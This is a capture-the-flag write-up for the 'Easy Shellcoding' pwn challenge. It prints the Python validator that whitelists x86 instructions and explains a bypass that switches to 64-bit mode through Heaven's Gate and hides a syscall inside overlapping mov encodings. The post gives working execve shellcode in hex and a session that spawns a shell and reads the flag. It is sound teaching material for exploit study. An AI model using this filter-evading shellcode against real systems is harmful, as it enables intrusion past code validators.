---
title: Easy Shellcoding
category: Amateurs-2025
tags: pwn
date: 2025-11-18
comments: false
---
## Overview
The challenge itself is pretty small:
```python
#!/usr/bin/python3

from capstone import *
from capstone.x86 import X86Op, X86_OP_IMM
import os

ALLOWED_MNEMONICS = ["jmp", "add", "mov", "sub", "inc", "dec", "cmp", "push", "pop", "int3"]

shellcode = b"\xbc\x00\x70\x76\x06" + bytes.fromhex(input("shellcode: ")) + b"\xcc"
if len(shellcode) > 0x1000:
    exit("too long")

cs = Cs(CS_ARCH_X86, CS_MODE_32)
cs.detail = True
it = cs.disasm(shellcode, 0x1337000)

offsets = []
nbytes = 0
insns = list(it)

for insn in insns:
    print(f"{insn.address:04x} {insn.mnemonic} {insn.op_str}")
    if not any(part in insn.mnemonic for part in ALLOWED_MNEMONICS):
        exit("bad insn")
    offsets.append(insn.address)
    nbytes += len(insn.bytes)

if nbytes != len(shellcode):
    exit("error decoding all the instructions")

for insn in insns:
    if "jmp" in insn.mnemonic:
        if len(insn.operands) < 1:
            exit("bad")

        target = insn.operands[-1]
        assert type(target) == X86Op

        if target.type != X86_OP_IMM:
            exit("jmp must be imm")
        
        addr = target.imm
        if addr not in offsets:
            exit("jmp must be valid")

template = bytearray(open("template.elf", "rb").read())
template[0x2000:0x3000] = shellcode.ljust(0x1000, b"\xcc")
with open("/tmp/solve.elf", "wb+") as fp:
    fp.write(template)
os.chmod("/tmp/solve.elf", 0o777)
os.execl("/tmp/solve.elf", "/tmp/solve.elf")
```
Despite its size, the challenge only had 5 solves. This code takes hex shellcode, disassembles it as x86 (32-bit), checks the instructions against a whitelist, and makes sure that jumps are to existing code (this prevents partial jumps, which would allow us to bypass the whitelist). The protections include no RWX sections, NX bit, and no relo/PIE. 
# Idea
Since partial jumps, self-modifying shellcode, putting shellcode on the stack, and jumps to registers are all protected against, and the binary executes itself as 32 bit, I was out of ideas. Luckily, I remembered that Heaven's Gate works on Linux, due to a previous challenge I did (Gateway). This works by running `ljmp 0x33:<address>`, which switches to 64-bit mode from 32-bit mode, with 0x33 being the 64-bit code segment selector in the Linux GDT. Due to this, the solution is as follows:
1. Set up arguments
2. Switch to 64-bit mode
3. Run syscall
  
To prevent the validator from marking any of the instructions as invalid/not allowed, I utilized `movabs`, which has an rex prefix that encodes to `dec ecx` on 32-bit and the rest encodes to a smaller mov. But since the smaller mov is 32-bit, the extra bytes are also disassembled, so a second mov hides the syscall instruction. 
# Solve
Thanks to `c-bass` for fixing the bugs (the setup of the syscall) in my shellcode after I had to leave. The first part of the shellcode is as follows:
```
1337000 mov esp, 0x6767000 ; stack setup, inserted by validator
1337005 sub eax, eax
1337007 push 0x68732f ; exec setup
133700c push 0x6e69622f
1337011 mov edi, esp
1337013 push eax
1337014 push eax
1337015 push eax
1337016 mov esi, esp
1337018 sub edx, edx
133701a mov al, 0x3b ; syscall number
133701c ljmp 0x33:0x1337023 ; switch to 64 bit mode
```
Now, from the disassembler's perspective, the rest is as follows:
```
49                  dec ecx ; rex prefix
b8 11108967  mov eax, 0x67891011 ; 32-bit mov
45                  inc ebp ; part of mov data
b8 0f050f05    mov eax, 0x50f050f ; part of mov data and the syscall
```
But in reality, it executes:
```
49 b8 1110896745b80f05 movabs  r8, 0x50fb84567891011 ; r8 is not needed for the syscall
0f 05                               syscall
```
And when it is run...
```
h@DESKTOP-TH1NKC3 ~/D/easy-shellcoding> nc amt.rs 57207
shellcode: 29c0682f736800682f62696e89e750505089e629d2b03bea23703301330049b81110896745b80f050f05
ls
flag
run
template.elf
cat flag
amateursCTF{to_hell_and_back}
```
